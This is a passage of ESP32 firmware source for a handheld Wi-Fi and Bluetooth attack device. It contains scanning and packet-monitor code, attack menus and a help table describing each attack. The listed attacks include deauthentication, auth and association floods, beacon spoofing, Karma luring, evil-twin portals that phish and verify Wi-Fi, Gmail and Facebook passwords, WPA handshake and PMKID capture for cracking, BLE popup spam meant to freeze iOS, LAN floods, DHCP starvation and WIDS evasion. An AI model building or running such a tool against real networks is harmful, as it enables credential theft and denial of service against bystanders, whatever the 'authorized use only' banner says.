  if(!mergePass)apCount=0;               // V22: the deep passive pass MERGES into the active results
  for(int i=0;i<n && apCount<MAX_APS;i++){
    int ch=WiFi.channel(i);
    if(!validScanChannel(ch))continue;
    String bssid=WiFi.BSSIDstr(i),ssid=WiFi.SSID(i);
    int32_t rssi=WiFi.RSSI(i);
    bool enc=(WiFi.encryptionType(i)!=WIFI_AUTH_OPEN);
    bool found=false;
    for(size_t k=0;k<apCount;k++) if(apIsSame(aps[k],bssid)){
      if(rssi>aps[k].rssi){aps[k].rssi=rssi;aps[k].channel=(uint8_t)ch;aps[k].ssid=ssid;aps[k].encrypted=enc;}
      found=true;break;
    }
    if(!found){
      aps[apCount].ssid=ssid;aps[apCount].bssid=bssid;aps[apCount].rssi=rssi;
      aps[apCount].channel=(uint8_t)ch;aps[apCount].encrypted=enc;
      apParseBSSID(bssid,aps[apCount].bssidBytes);
      apCount++;
    }
  }
  WiFi.scanDelete();sortAPs();wifiScanInProgress=false;
  Serial.printf("[SCAN] %u APs%s\n",(unsigned)apCount,mergePass?" (deep pass merged)":"");
}
static void cancelScan(){
  if(!wifiScanInProgress)return;
  WiFi.scanDelete();wifiScanInProgress=false;scanThenSelect=false;scanThenSta=false;
}

// ------------------------- Real station scan -------------------------
// Uses the engine promiscuous sniffer (port of Nova X STA scan): hops channels
// and links client MACs to known APs from data frames.
static void beginStaScan(){
  if(wifiScanInProgress||ae::staScanActive())return;
  stopMonitor();
  syncEngineAPs();
  if(ae::knownAPCount()==0){
    scanThenSta=true;
    beginScanAPs();
    return;
  }
  scanMode=SCAN_MODE_STAS;scanBaseDrawn=false;
  if(ae::staScanStart()){
    screen=STA_RESULTS;menuIndex=0;listTop=0;popup=false;
    visualScanActive=false;
    drawCurrent();lcdPush(fb);
  } else {
    showPopup("STATION SCAN","NEED APS FIRST","RUN ACCESS POINT SCAN");
  }
}
static void cancelStaScan(){
  if(!ae::staScanActive())return;
  ae::staScanStop();
}
static void serviceScan(){
  const uint32_t now=millis();
  if(wifiScanInProgress){
    int r=WiFi.scanComplete();
    if(r>=0){
      finishScanAPs(r,scanPass>0);
      // V22 deep scan: on MAX power a passive second pass runs after the
      // active pass so hidden / quiet / far APs are heard too.
      if(scanDeepPass() && scanPass==0){
        scanPass=1;
        scanStartMs=millis();            // fresh timeout window for pass 2
        WiFi.scanDelete();
        WiFi.scanNetworks(true,true,true,scanDeepDwellMs());
        Serial.printf("[SCAN] deep passive pass started dwell=%ums\n",(unsigned)scanDeepDwellMs());
        return;
      }
      if(scanThenSelect){scanThenSelect=false;transitionTo(AP_SELECT);}
      else if(scanThenSta){scanThenSta=false;beginStaScan();}
      else if(smartStage==1){ smartPickBest(); }   // V26 SMART: scan was step 1
      else { transitionTo(AP_RESULTS); }
      return;
    }
    if(r==-2){
      cancelScan();
      if(pendingTargetAction){Screen backTo=pendingActionReturn;pendingTargetAction=false;pendingTargetActionTitle="";transitionTo(backTo);}
      else transitionTo(wifiConnectMode?CONNECT_WIFI:SCAN);
      showPopup("SCAN","START FAILED","WIFI SCAN");return;
    }
    if(now-scanStartMs>25000){
      cancelScan();
      if(pendingTargetAction){Screen backTo=pendingActionReturn;pendingTargetAction=false;pendingTargetActionTitle="";transitionTo(backTo);}
      else transitionTo(wifiConnectMode?CONNECT_WIFI:SCAN);
      showPopup("SCAN","TIMEOUT","NO RESULT");return;
    }
    if(screen==SCAN_BUSY && now-scanLastDrawMs>=90){scanLastDrawMs=now;scanAnimPhase++;drawScanLoading();}
    return;
  }
  if(ae::staScanActive() && screen==STA_RESULTS){
    ae::staScanService();
    if(now-visualScanLastDrawMs>=600){
      visualScanLastDrawMs=now;
      drawCurrent();
      lcdPushRect(fb,0,48,TFT_W,385);
    }
    return;
  }
  if(visualScanActive){
    if(now-visualScanStartedMs>=3200){
      visualScanActive=false;screen=SCAN;menuIndex=0;listTop=0;
      drawCurrent();lcdPush(fb);
      showPopup("STA SCAN","ANIMATION COMPLETE","NO DEVICE DATA COLLECTED",1800);
      return;
    }
    if(now-visualScanLastDrawMs>=90){visualScanLastDrawMs=now;visualScanPhase++;scanAnimPhase++;drawScanLoading();}
  }
}

// ------------------------ Passive Packet Monitor --------------------
// Receive-only channel hopper: 2.4 GHz channels and common EU 5 GHz channels.
// No transmitter APIs or crafted frames are used here.
static const uint8_t MONITOR_CHANNELS[] = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,
  36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140
};
static constexpr uint8_t MONITOR_CHANNEL_COUNT=sizeof(MONITOR_CHANNELS)/sizeof(MONITOR_CHANNELS[0]);
static volatile uint32_t pktTotal=0,pktBeacon=0,pktProbeReq=0,pktProbeResp=0;
static volatile uint32_t pktAuth=0,pktAssoc=0,pktDeauth=0,pktDisassoc=0,pktAction=0,pktOtherMgmt=0;
static volatile uint32_t pktData=0,pktCtrl=0,pktMgmt=0,pktWindow=0;
static volatile uint32_t pktEapol=0;
static volatile uint8_t snifferChannel=1;
static volatile uint32_t pktByChannel[MONITOR_CHANNEL_COUNT]{};
static uint32_t pktRate=0,pktLastMs=0,monitorLastHopMs=0;
static uint16_t pktHistory[24]{};
static uint8_t pktHistoryPos=0;
// V22: the packet monitor hop also follows ATTACK POWER - FAST sweeps the
// band quickly, DEEP listens longer on every channel to pull more packets
// out of quiet air.
static uint32_t monitorHopMs(){
  switch(ae::powerLevel()){
    case ae::Power::PWR_LOW: return 200;
    case ae::Power::PWR_MAX: return 480;
    default: return 300;
  }
}
static volatile uint8_t monitorChannelIndex=0;
static volatile uint8_t monitorTuneChannel=1;
static uint8_t monitorView=0; // 0 summary, 1 frame types, 2 channel histogram
static bool monitor5GView=false;
static volatile bool monitorActive=false;

// The unified promiscuous callback lives in AttackEngine.h (ae::unifiedSniffer)
// and feeds these counters through snifferHookMonitor() / snifferHookEAPOL().
// Legacy local packetSniffer was removed in the merged firmware.

// Detail counters are updated inside snifferHookMonitor via a second-pass on
// management subtypes; to keep the hook cheap we do full subtype accounting here
// from a wrapper that mirrors the engine callback payload.
static void IRAM_ATTR monitorSubtypeHook(uint8_t subtype){
  switch(subtype){
    case 8: pktBeacon++; break;                 // beacon
    case 4: pktProbeReq++; break;               // probe request
    case 5: pktProbeResp++; break;              // probe response
    case 11: pktAuth++; break;                  // authentication
    case 0: case 1: case 2: case 3: pktAssoc++; break; // association/reassociation
    case 12: pktDeauth++; break;                // deauthentication observed
    case 10: pktDisassoc++; break;              // disassociation observed
    case 13: pktAction++; break;                // action management frame
    default: pktOtherMgmt++; break;
  }
}

// Full-featured local sniffer: same behavior as the engine one but with the
// detailed subtype counters for the monitor TYPES view. Registered instead of
// the engine callback whenever the monitor page is active.
static void IRAM_ATTR monitorSniffer(void *buf,wifi_promiscuous_pkt_type_t type){
  if(!monitorActive||!buf)return;
  const wifi_promiscuous_pkt_t *p=(const wifi_promiscuous_pkt_t*)buf;
  const uint16_t sigLen=p->rx_ctrl.sig_len;
  const uint8_t ch=p->rx_ctrl.channel;
  snifferHookMonitor(type,0,ch,sigLen);
  if(type!=WIFI_PKT_MGMT||sigLen<2)return;
  monitorSubtypeHook((uint8_t)((p->payload[0]>>4)&0x0F));
}

static bool monitorTuneNextChannel(){
  for(uint8_t step=1;step<=MONITOR_CHANNEL_COUNT;step++){
    uint8_t idx=(uint8_t)((monitorChannelIndex+step)%MONITOR_CHANNEL_COUNT);
    esp_err_t rc=esp_wifi_set_channel(MONITOR_CHANNELS[idx],WIFI_SECOND_CHAN_NONE);
    if(rc==ESP_OK){
      monitorChannelIndex=idx;monitorTuneChannel=MONITOR_CHANNELS[idx];
      snifferChannel=monitorTuneChannel;monitorLastHopMs=millis();return true;
    }
  }
  return false;
}
static void startMonitor(){
  if(monitorActive)return;
  // Promiscuous capture and station connectivity cannot share a channel hopper.
  if(WiFi.status()==WL_CONNECTED)WiFi.disconnect(false,false);
  WiFi.mode(WIFI_STA);WiFi.setSleep(false);
  esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  pktTotal=pktBeacon=pktProbeReq=pktProbeResp=pktAuth=pktAssoc=0;
  pktDeauth=pktDisassoc=pktAction=pktOtherMgmt=pktData=pktCtrl=pktMgmt=pktWindow=0;
  pktRate=0;pktLastMs=millis();monitorLastHopMs=millis();
  for(uint8_t i=0;i<24;i++)pktHistory[i]=0;
  for(uint8_t i=0;i<MONITOR_CHANNEL_COUNT;i++)pktByChannel[i]=0;
  monitorChannelIndex=(uint8_t)(MONITOR_CHANNEL_COUNT-1);monitorTuneChannel=1;
  monitorView=0;monitor5GView=false;
  pktEapol=0;
  monitorTuneNextChannel();
  wifi_promiscuous_filter_t filter{};
  filter.filter_mask=WIFI_PROMIS_FILTER_MASK_MGMT|WIFI_PROMIS_FILTER_MASK_DATA|WIFI_PROMIS_FILTER_MASK_CTRL;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&monitorSniffer);
  monitorActive=true;
  if(esp_wifi_set_promiscuous(true)!=ESP_OK)Serial.println("[MONITOR] promiscuous enable failed");
}
static void stopMonitor(){
  if(!monitorActive)return;
  monitorActive=false;
  // Do not kill the shared sniffer if the station scanner or Karma needs it.
  if(!ae::staScanActive() && !ae::karmaActive()){
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
  }
}
static void updateMonitor(){
  if(!monitorActive)return;
  uint32_t now=millis();
  if(now-monitorLastHopMs>=monitorHopMs())monitorTuneNextChannel();
  if(now-pktLastMs>=1000){
    const uint32_t windowCount=(uint32_t)pktWindow;
    pktRate=windowCount;
    const uint32_t cappedCount=(windowCount>65535UL)?65535UL:windowCount;
    pktHistory[pktHistoryPos]=(uint16_t)cappedCount;
    pktHistoryPos=(uint8_t)((pktHistoryPos+1)%24);pktWindow=0;pktLastMs=now;
  }
}

// ----------------------------- UI ----------------------------------

static const char* MAIN_ITEMS[]={"Exploit","Scan","Connect WiFi","Packet Monitor","Settings","About"};
static const char* EXPLOIT_ITEMS[]={"Deauth","Auth","Assoc","Beacon","AP Spoofing","Combo","B.T Adv"};
static const char* DEAUTH_ITEMS[]={"All APs","By Channel","Selected APs","Selected STAs","All STAs","Storm (Hop)","2-Way (WIDS)","Find WiFi 2.4G","Find WiFi 5G"};
static const char* THREE_ITEMS[]={"All APs","By Channel","Selected APs"};
static const char* BEACON_ITEMS[]={"All SSIDs Dupe","Selected Dupe","Random","By Channel","Prefix","Rickroll","Fake Storm"};
static const char* SPOOF_ITEMS[]={"AP Clone (Spoof)","Probe Karma Flood","Probe Reply Flood","MAC Random","MAC Restore"};
static const char* COMBO_ITEMS[]={"Evil Twin","Mega Evil Twin","Handshake Cap","PMKID Grab","Deauth + Rickroll","Total Outage","Client Hunter","Drone Duo (2 boards)","Smart Attack"};
static const char* BT_ITEMS[]={"Apple / iOS","Samsung","Android","Windows","All (Seq)","Random Mix","Sour Apple iOS","Android Crash","BLE Apocalypse"};
static const char* IN_NET_ITEMS[]={"Net Scan (Hosts)","UDP Flood","TCP Flood","HTTP Flood","DHCP Starve","SSDP Flood","LAN Apocalypse"};
static const char* DRONE_ITEMS[]={"Link Drone","Unlink Drone","Duo Evil Twin (5GHz)","Duo Crossfire","Duo Pincer 2.4+5G","Duo Handshake","Duo Sweep Jam","Duo Beacon Clone","Drone Status"};

struct HelpTopic {
  const char *title;
  const char *subtitle;
  const char *line1;
  const char *line2;
  const char *line3;
  const char *line4;
  const char *line5;
};
static const HelpTopic HELP_TOPICS[] = {
  {"AUTHORIZED USE ONLY","Legal scope of this tool",
   "Every module here transmits REAL radio",
   "frames with full TX power.",
   "Test ONLY networks you own or are",
   "authorized to assess in writing.",
   "Unauthorized jamming is a crime."},
  {"ACCESS POINT SCAN","Signal-sorted, power-scaled",
   "2.4+5 GHz channels are probed and the",
   "list is sorted STRONGEST SIGNAL FIRST",
   "- closest APs on top, weak ones at the",
   "bottom. ATTACK POWER sets the depth:",
   "FAST / BALANCED / DEEP (2nd pass)."},
  {"SMART ATTACK","One tap, the whole playbook",
   "Combo > Smart Attack picks the STRONGEST",
   "named network by itself: captures the",
   "handshake (max 45 s), then opens the",
   "clone AP + portal automatically. Dual",
   "mode ON adds the drone jam. Zero setup."},
  {"MAC SPOOF","New identity for this board",
   "AP Spoofing > MAC Random gives the C5 a",
   "fresh random MAC (logs and client lists",
   "see a new device); MAC Restore puts the",
   "factory MAC back. Blocked while an",
   "attack, scan or evil twin owns the radio."},
  {"DRONE DUO","Two C5 boards, double power",
   "A second ESP32-C5 (SX-DRONE) links",
   "by cable (3 wires) the moment an",
   "attack starts: this board runs the",
   "portal or sniffer while the drone jams",
   "2.4 AND 5 GHz. ADVANCED > Drone Duo."},
  {"DRONE LINK","Pair and command the drone",
   "Flash SALARINI_DRONE_C5 (v1.5) on",
   "the second board. Connect ANY two",
   "GPIOs + GND from the safe pin list:",
   "the firmware sweeps every pin pair",
   "until the link lands, then saves it."},
  {"FIND WIFI","Discover a device's network",
   "DEAUTH > Find WiFi 2.4G/5G. Pick",
   "one client: it gets kicked forever",
   "while the sniffer watches which AP",
   "it runs back to. Beacons and probes",
   "reveal the name. TAP YES = confirm."},
  {"DUAL MODE","One switch: all attacks dual",
   "SETTINGS > DUAL MODE > ON (saved).",
   "Every Wi-Fi attack then links the drone",
   "at start, both radios hit the targets,",
   "and a lost link auto-reconnects while",
   "the attack runs. BLE spam stays local."},
  {"DUO SWEEP JAM","Full-spectrum wipe, two radios",
   "DRONE DUO > Duo Sweep Jam. The drone",
   "hops every 2.4 and 5 GHz channel with",
   "broadcast deauth bursts while this",
   "board storms every AP it knows. No",
   "target pick needed - the total wipe."},
  {"DUO BEACON CLONE","Flood an SSID on both radios",
   "DRONE DUO > Duo Beacon Clone, then",
   "pick an AP: this board beacons the",
   "SSID while the drone jams the real",
   "family AND clones the name on a far",
   "channel. The SSID looks EVERYWHERE."},
  {"STATION SCAN","How clients are discovered",
   "Promiscuous mode captures ALL frames,",
   "not only those addressed to us.",
   "Data frames expose both link MACs, so",
   "each client is mapped to its AP BSSID.",
   "The registry holds up to 64 clients."},
  {"DEAUTH > ALL APS","How deauthentication works",
   "Sends forged 802.11 management frames",
   "(subtype C0, reason 7) that spoof the",
   "AP and order every client to log off.",
   "WPA2 does not protect mgmt frames, so",
   "clients obey. 802.11w/WPA3 resists."},
  {"DEAUTH > BY CHANNEL","Single-channel denial",
   "Same forged deauth frames, but only",
   "the APs beaconing on the chosen",
   "channel are targeted. Raw TX is locked",
   "to that channel for maximum effect.",
   "Useful to test one radio of a mesh."},
  {"DEAUTH > SELECTED APS","Targeted deauth mechanism",
   "Only the BSSIDs you confirmed become",
   "targets. Each burst alternates source",
   "spoofing between the APs so their",
   "clients disconnect simultaneously.",
   "Surgical: everything else stays up."},
  {"DEAUTH > SELECTED STAS","Client-directed kick",
   "Deauth frames sent to ONE client MAC",
   "with the AP as sender, plus disassoc",
   "(A0) frames. The client thinks the AP",
   "dropped it and starts reconnecting.",
   "That device alone loses Wi-Fi."},
  {"DEAUTH > ALL STAS","Evict every tracked client",
   "Cycles the client registry and sends",
   "deauth + disassoc pairs to each MAC",
   "on its own channel. Needs Station",
   "Scan first: the registry is filled by",
   "passive capture, not guessing."},
  {"DEAUTH > STORM (HOP)","Channel-hopping denial",
   "Sweeps all 2.4 + 5 GHz attack channels",
   "and deauths every AP and tracked",
   "client found on each one, non-stop.",
   "Clients reconnect and get dropped",
   "again each pass. Maximum pressure."},
  {"AUTH FLOOD","Authentication frame flood",
   "Open-system auth requests from random",
   "spoofed client MACs, many per second.",
   "The AP allocates state for each one,",
   "exhausting its client table and CPU.",
   "Consumer routers stall after ~200."},
  {"ASSOC FLOOD","Association table exhaustion",
   "Full association requests (with SSID,",
   "rates, HT capabilities) from fake MACs.",
   "Each accepted request consumes an AP",
   "association slot until it is full, so",
   "real clients cannot associate anymore."},
  {"BEACON DUP / RANDOM","How fake AP flooding works",
   "Raw beacon frames (subtype 80) forge",
   "whole networks: SSID, BSSID, channel",
   "and RSN security element. Phones show",
   "them instantly. Dupe clones real APs;",
   "Random invents new ones at high rate."},
  {"BEACON > RICKROLL","Beacon injection demo",
   "Broadcasts 12 meme SSIDs on rotating",
   "channels with fresh BSSIDs each time.",
   "Purely beacon frames: harmless, but",
   "shows how easily Wi-Fi lists can be",
   "fabricated by radio-level injection."},
  {"BEACON > FAKE STORM","Maximum beacon noise",
   "Random SSID + BSSID + channel + open",
   "or encrypted flag on every frame at",
   "the fastest pace of the firmware.",
   "Scanners and phones spend CPU drawing",
   "endless fake networks. Stress test."},
  {"AP SPOOFING > CLONE","How AP cloning works",
   "Clones the victim SSID and BSSID on",
   "rotating channels, answers probe",
   "requests with its real identity and",
   "deauths the original every 10 s, so",
   "clients drift toward the impostor."},
  {"PROBE KARMA FLOOD","How Karma luring works",
   "Devices broadcast saved SSID names in",
   "probe requests looking for networks.",
   "Karma answers EVERY probe with a fake",
   "AP of that exact name, so devices try",
   "to auto-connect to the impostor."},
  {"EVIL TWIN","Rogue AP + captive portal",
   "Clones the victim SSID as a real softAP",
   "on the victim channel while a deauth",
   "loop keeps the original AP's clients",
   "homeless. Wildcard DNS plus OS checks",
   "force the popup; creds go to NVS+SD."},
  {"MEGA EVIL TWIN","Three mega modes in one menu",
   "Opens the mode picker: REPLICATE INTERNET",
   "(NAT uplink), LIVE KEYBOARD PAGE (your own",
   "text) and FIX WIFI (verify + restore). All",
   "three clone the victim and deauth on the",
   "exact victim channel, 2.4 + 5 GHz."},
  {"REPLICATE INTERNET","Mega twin with real internet",
   "Once the real password is known (typed in",
   "or captured and verified from a victim) the",
   "board joins the real network and lwIP NAPT",
   "shares that uplink with every clone client,",
   "so the fake AP becomes a working connection."},
  {"KEYBOARD PAGE","Your own live portal text",
   "Type the message on the on-screen keyboard",
   "before the attack: the captive portal shows",
   "your exact words over the cloned SSID with",
   "a password field. Custom stories in any",
   "language without editing HTML files."},
  {"HANDSHAKE CAPTURE","How WPA handshakes are taken",
   "Watches the victim channel in",
   "promiscuous mode for EAPOL frames,",
   "the 4-way handshake of WPA/WPA2.",
   "A light deauth pulse forces clients",
   "to reconnect; frames save to .PCAP."},
  {"PMKID GRAB","Clientless hash capture",
   "Sends association requests from fake",
   "MACs. Vulnerable routers put the",
   "PMKID hash inside EAPOL message 1,",
   "no client needed. The 16-byte hash",
   "is parsed and saved for cracking."},
  {"COMBO > DEAUTH+RICKROLL","Denial plus joke networks",
   "Alternates a full deauth sweep tick",
   "with a rickroll beacon frame. Clients",
   "drop while every nearby Wi-Fi list",
   "fills with meme SSIDs. Works with or",
   "without a previous AP scan."},
  {"COMBO > TOTAL OUTAGE","All layers at the same time",
   "Deauth sweep on every channel plus",
   "random fake beacons plus BLE vendor",
   "spam, all driven from one loop. The",
   "most radio noise this board can make.",
   "Short sessions only, own lab only."},
  {"B.T ADV SPAM","How BLE advertisement spam works",
   "Sends real BLE advertising packets",
   "with randomized MACs and vendor-shaped",
   "payloads: Apple, Samsung, Google Fast",
   "Pair, Windows Swift Pair. Phones open",
   "pairing popups. NimBLE-Arduino 20 dBm."},
  {"PACKET MONITOR","Passive frame statistics",
   "Promiscuous receiver counts every",
   "management, control and data frame",
   "per channel. The TYPES view isolates",
   "EAPOL frames: each one is part of a",
   "WPA handshake happening nearby."},
  {"CONNECT WIFI","Normal station connection",
   "Standard WPA association via the",
   "Wi-Fi driver: scan, pick network,",
   "send passphrase, obtain IP by DHCP.",
   "Credentials stay in RAM only, and any",
   "attack stops the connection first."},
  {"SELECT APS / STAS","How target picking works",
   "Check the rows you want, then tap the",
   "green CONFIRM pill at the bottom.",
   "The queued attack launches on exactly",
   "those targets. Lists come from the",
   "latest scan; rescan for fresh data."},
  {"ATTACK POWER","How power levels change attacks",
   "LOW: half bursts, double pause - a",
   "gentle, low-interference stress test.",
   "MED: original Nova X reference rates.",
   "MAX: double bursts at full pacing,",
   "max frames per second. Saved in NVS."},
  {"BRIGHTNESS / ROTATION","Screen controls",
   "Backlight is driven through the CH32",
   "expander as a PWM duty cycle.",
   "Rotation flips the framebuffer and",
   "touch axes together. Both settings",
   "persist in NVS across reboots."},
  {"COLOR THEMES","Theme engine",
   "Palettes are RGB565 sets applied to",
   "cards, accents and text at draw time.",
   "One memory write per pixel, no extra",
   "framebuffer passes, so themes cost",
   "zero extra frames while drawing."},
  {"POWER / BATTERY","AXP2101 power manager",
   "The PMU reports battery voltage,",
   "charge current and VBUS over I2C.",
   "The native fuel gauge percentage is",
   "the authoritative value shown. TX",
   "attacks increase battery drain a lot."},
  {"MICROSD","Files the firmware writes",
   "/CAPTURED.TXT stores evil twin creds,",
   "/HS_EAPOL.PCAP stores raw handshake",
   "frames for Wireshark, /SALARINI_STATUS",
   ".TXT is the log. Put /PORTAL.HTML on",
   "the card for your own phishing page."},
  {"SPEAKER / AUDIO","ES8311 codec path",
   "I2S output through the ES8311 codec",
   "at 48 kHz. Volume lives in a codec",
   "register, mute and level persist in",
   "NVS. The test tone verifies the whole",
   "I2C + I2S chain on demand."},
  {"TOUCH KEYBOARD","Text entry details",
   "Two layouts (letters and symbols) plus",
   "shift. SSID max 32 chars, passwords 63,",
   "the same limits the 802.11 frames have.",
   "It is used for Wi-Fi join and for the",
   "beacon prefix attack text."},
  {"LIVE ATTACK SCREEN","Reading the counters",
   "SENT counts raw frames pushed through",
   "esp_wifi_80211_tx; RATE is frames per",
   "second. Handshake modes show M1-M4 +",
   "PMKID state; evil twin shows portal",
   "hits and creds. TAP the red STOP bar."},
  {"DEAUTH > 2-WAY (WIDS)","Bidirectional WIDS bypass",
   "Normal deauth only spoofs the AP. This",
   "mode also sends deauth frames FROM",
   "random fake clients TO the AP, so the",
   "router tears down client state itself.",
   "Reason codes rotate 7/4/15 to evade"},
  {"PROBE REPLY FLOOD","How scanner flooding works",
   "Every device hunting for Wi-Fi sends",
   "probe requests. Each one gets FOUR",
   "forged networks from random BSSIDs as",
   "an answer, so nearby Wi-Fi lists fill",
   "with fake SSIDs faster than refresh."},
  {"CLIENT HUNTER","Sniff-and-kick automation",
   "Locks the radio on the victim channel",
   "and alternates: a deauth pulse forces",
   "clients to reconnect, then every client",
   "the sniffer catches is kicked directly",
   "with deauth + disassoc. Fully automatic."},
  {"IN-NET ATTACKS","Post-connection attack suite",
   "After joining a Wi-Fi as a normal",
   "client, the board attacks FROM INSIDE",
   "with TCP/UDP sockets: host discovery,",
   "floods, DHCP exhaustion. No raw frames",
   "needed, so it works on any network."},
  {"NET SCAN","How LAN hosts are found",
   "Multicasts SSDP M-SEARCH to every",
   "UPnP device plus mDNS queries to the",
   ".local zone. TVs, consoles, printers,",
   "routers and phones answer with their",
   "IP in the 4 s sweep. Tap to target."},
  {"UDP FLOOD","Datagram flood mechanics",
   "Pushes 1 KB UDP datagrams at maximum",
   "socket rate to broadcast or a chosen",
   "host. Saturates LAN airtime and heats",
   "the target CPU. The POWER level sets",
   "the pacing window between bursts."},
  {"TCP FLOOD","Connection churn explained",
   "Opens and recycles TCP connections in",
   "a loop: every SYN consumes backlog and",
   "state on the target until timeouts",
   "fire, so embedded devices drop their",
   "real users first. Gateway or NET SCAN."},
  {"HTTP FLOOD","Web server request flood",
   "Serialized HTTP GET requests against",
   "a LAN web server (router UI, camera,",
   "printer). Each request forces parsing",
   "work on weak devices until they slow",
   "to a crawl. 150 ms timeout per try."},
  {"DHCP STARVE","How lease pools are exhausted",
   "Broadcasts DHCPDISCOVER packets with",
   "randomized chaddr and client-id option",
   "61 every few ms. The server reserves",
   "one lease per identity, so the pool",
   "drains and new devices get no IP."},
  {"SSDP FLOOD","UPnP discovery storm",
   "Repeats SSDP M-SEARCH multicasts to",
   "239.255.255.250:1900. Every UPnP device",
   "replies with long XML data, turning one",
   "small request into many big answers:",
   "reflection amplification, inside LAN."},
  {"LAN APOCALYPSE","All IN-NET layers combined",
   "One loop rotates UDP broadcast flood,",
   "SSDP storm, DHCP starvation and HTTP",
   "flood against the gateway. Every LAN",
   "attack surface pressured at once. MAX",
   "power + short sessions, own lab only."},
  {"SOUR APPLE (MAX)","iOS popup freeze mechanism",
   "Streams ONLY the 13 Apple action-modal",
   "payloads (AppleTV setup, HomePod, phone",
   "transfer) at maximum NimBLE rate. Each",
   "forces iOS to render a pairing dialog,",
   "dozens per second freeze Bluetooth UI."},
  {"BLE APOCALYPSE","All vendors at maximum rate",
   "Randomly rotates Apple, Samsung, Fast",
   "Pair and Windows Swift Pair payloads",
   "with zero pacing, so every OS in range",
   "gets a different popup stream at the",
   "same time. The heaviest BLE load."},
  {"FIX WIFI TWIN","Story portal with live check",
   "Deauths the area smartly and opens an AP",
   "named 'Fix WiFi'. The page tells a provider",
   "maintenance story and asks the victim to",
   "pick their network and type its password.",
   "Each try is verified against the real AP."},
  {"FIX WIFI VERIFY","How the credential check works",
   "Each captured password is fed to WiFi.begin",
   "against the selected network. Only the real",
   "password makes the STA associate, so wrong",
   "tries get the error page and the right one",
   "stops the attack and prints SUCCESSFUL."},
  {"PORTAL TEMPLATES","HTML pages for evil twins",
   "Before any evil attack a picker lists the",
   "built-in pages (Wi-Fi pass, Gmail, Facebook,",
   "Instagram, Office 365, Fix WiFi story, live",
   "keyboard page) plus every *.html / *.htm on",
   "the SD card - your own page is one tap away."},
  {"EAPOL FLOOD (802.1X)","Authenticator exhaustion",
   "Sends EAPOL-Start frames from thousands of",
   "random MACs. Every frame makes the AP's",
   "802.1X authenticator allocate supplicant",
   "state that never completes, draining memory",
   "and CPU until new clients cannot join."},
  {"QOS NULL FLOOD","Power-save buffer exhaustion",
   "QoS-Null frames announce buffered traffic",
   "for fake dozing clients. The AP stores the",
   "frames waiting for a wakeup that never",
   "comes: retry buffers and airtime drain on",
   "both the AP and every connected client."},
  {"RTS SIGNAL FLOOD","Airtime reservation DoS",
   "RTS control frames reserve the medium via",
   "the NAV timer with a 300us duration that no",
   "CTS ever releases. Every radio on the",
   "channel waits politely forever, so all",
   "traffic starves without a single deauth."},
  {"SPINNER STAGE (V20)","New attack live screen",
   "Every attack now shows a Windows-style",
   "spinning-dot loader and the current action",
   "(DEAUTHING, FLOODING...). No counters or",
   "charts. Info screens appear only where it",
   "matters: portal terminal + capture states."}
};

static constexpr size_t HELP_TOPIC_COUNT=sizeof(HELP_TOPICS)/sizeof(HELP_TOPICS[0]);
static uint8_t helpSelection=0;
static uint8_t helpListTop=0;

static String actionTitle="ACTION";
static String actionTargetSSID="";
static Screen actionReturnScreen=EXPLOIT;
static uint32_t actionStartedMs=0;
static uint8_t actionAnimPhase=0;
static uint32_t attackLiveLastDrawMs=0;

// BLE-only carrier for the B.T Adv live screen (no Wi-Fi TX involved)
static bool     sBLECarrierActive=false;
static String   sBLECarrierTitle="BLE ADV SPAM";
static String   sBLECarrierTarget="";
static uint32_t sBLECarrierStart=0;

// Bridge required by AttackEngine.h: stops the BLE spammer (idempotent).
void bleSpamStopBridge(){ ble::stop(); }

// Sniffer hooks fed by AttackEngine's unified promiscuous callback.
static void snifferHookMonitor(wifi_promiscuous_pkt_type_t type, uint8_t subtype, uint8_t channel, uint16_t len){
  (void)subtype;
  if(!monitorActive) return;
  pktTotal++; pktWindow++;
  uint8_t idx=monitorChannelIndex;
  if(idx<MONITOR_CHANNEL_COUNT && channel==monitorTuneChannel) pktByChannel[idx]++;
  if(type==WIFI_PKT_DATA){pktData++;return;}
  if(type==WIFI_PKT_CTRL){pktCtrl++;return;}
  if(type!=WIFI_PKT_MGMT||len<2)return;
  pktMgmt++;
}
static void snifferHookEAPOL(uint8_t channel){ (void)channel; pktEapol++; }

// Sync the engine AP registry with the UI scan cache.
static void syncEngineAPs(){
  ae::clearKnownAPs();
  for(size_t i=0;i<apCount;i++){
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::addKnownAP(b,aps[i].ssid.c_str(),aps[i].channel,aps[i].encrypted);
  }
}

// ---- attack launch helpers -------------------------------------------
static void launchAPAttack(ae::AttackType type,const char* title){
  stopMonitor();
  if(wifiScanInProgress){cancelScan();}
  syncEngineAPs();
  std::vector<ae::TargetAP> targets;
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[i].ssid.c_str(),32);
    t.channel=aps[i].channel; t.encrypted=aps[i].encrypted; t.rssi=aps[i].rssi;
    targets.push_back(t);
  }
  if(targets.empty()){showPopup(title,"NO TARGETS","RUN A SCAN FIRST");return;}
  if(type==ae::AttackType::DEAUTH_ALL) ae::sortTargetsByRSSI(targets);   // closest networks first
  String t0=displaySSID(aps[0].ssid,20);
  String lbl=(targets.size()==1)?t0:(String((unsigned)targets.size())+" APS");
  ae::attackStart(type,title,lbl.c_str(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchSelectedAPAttack(ae::AttackType type,const char* title){
  pendingSelectAttack=type;
  pendingSelectTitle=title;
  pendingTargetAction=false;pendingTargetActionTitle="";
  if(apCount==0){scanThenSelect=true;beginScanAPs();return;}
  listTop=0;transitionTo(AP_SELECT);
}

static void confirmSelectedAPAttack(){
  std::vector<ae::TargetAP> targets;
  String first="";
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    if(!selectedAP[i])continue;
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[i].ssid.c_str(),32);
    t.channel=aps[i].channel; t.encrypted=aps[i].encrypted; t.rssi=aps[i].rssi;
    targets.push_back(t);
    if(first.length()==0)first=displaySSID(aps[i].ssid,20);
    selectedAP[i]=false;
  }
